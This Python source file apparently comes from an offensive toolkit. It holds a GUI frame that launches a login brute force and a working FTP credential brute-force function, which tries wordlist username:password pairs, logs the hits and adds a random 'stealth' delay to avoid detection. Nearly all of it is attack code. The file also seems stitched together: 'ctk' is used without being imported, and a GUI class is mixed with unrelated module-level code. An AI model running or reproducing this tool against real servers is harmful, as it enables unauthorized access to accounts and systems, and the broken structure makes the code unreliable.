import ftplib
import time
import socket
import random
from utils.wordlist_manager import wordlist_manager
import os

class BruteForceFrame(ctk.CTkFrame):
    def __init__(self, parent, toast, set_status):
        super().__init__(parent)
        self.toast = toast
        self.set_status = set_status

        self.target_entry = ctk.CTkEntry(self, placeholder_text="Login URL")
        self.username_entry = ctk.CTkEntry(self, placeholder_text="Username")
        self.wordlist_entry = ctk.CTkEntry(self, placeholder_text="Wordlist Path")
        self.output_box = ctk.CTkTextbox(self, height=200)

        self.run_button = ctk.CTkButton(self, text="Run Brute Force", command=self.run_exploit)

        self.target_entry.pack(padx=10, pady=5)
        self.username_entry.pack(padx=10, pady=5)
        self.wordlist_entry.pack(padx=10, pady=5)
        self.run_button.pack(padx=10, pady=10)
        self.output_box.pack(padx=10, pady=10, fill="both", expand=True)

    def run_exploit(self):
        target = self.target_entry.get()
        user = self.username_entry.get()
        wordlist = self.wordlist_entry.get()

        self.set_status("Running brute force...")
        self.output_box.insert("end", f"Target: {target}\nUsername: {user}\nStarting...\n")

        # Import and run the script's core logic
        from core.exploits.exploit_bruteforce import brute_force
        brute_force(target, user, wordlist, delay=0.5, output_file=None)

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
HITS_FILE = os.path.join(BASE_DIR, "logs", "hits.txt")
SESSION_FILE = os.path.join(BASE_DIR, "logs", "session.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "xvector_log.txt")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
def ftp_brute_force(target, port=21, wordlist_file="ftp_default_creds.txt", stealth_mode=False, timeout=5, logger=print):
    logger(f"[*] Starting FTP brute-force on {target}:{port} with wordlist: {wordlist_file}")

    try:
        creds = wordlist_manager.load_random() if stealth_mode else wordlist_manager.load(wordlist_file)

        for cred in creds:
            if ":" in cred:
                username, password = cred.strip().split(":", 1)
            else:
                username = password = cred.strip()

            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(target, port, timeout=timeout)
                    ftp.login(user=username, passwd=password)
                    logger(f"[+] FTP Login Success: {username}:{password}")
                    return {
                        "status": "success",
                        "username": username,
                        "password": password
                    }
            except ftplib.error_perm as e:
                logger(f"[-] Failed: {username}:{password} - {e}")
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                logger(f"[!] Connection error: {e}")
                break

            if stealth_mode:
                delay = random.uniform(0.5, 2.5)
                logger(f"[~] Stealth delay: {delay:.2f}s")
                time.sleep(delay)

    except Exception as ex:
        logger(f"[!] Error in FTP brute-force module: {ex}")

    return {"status": "failed"}
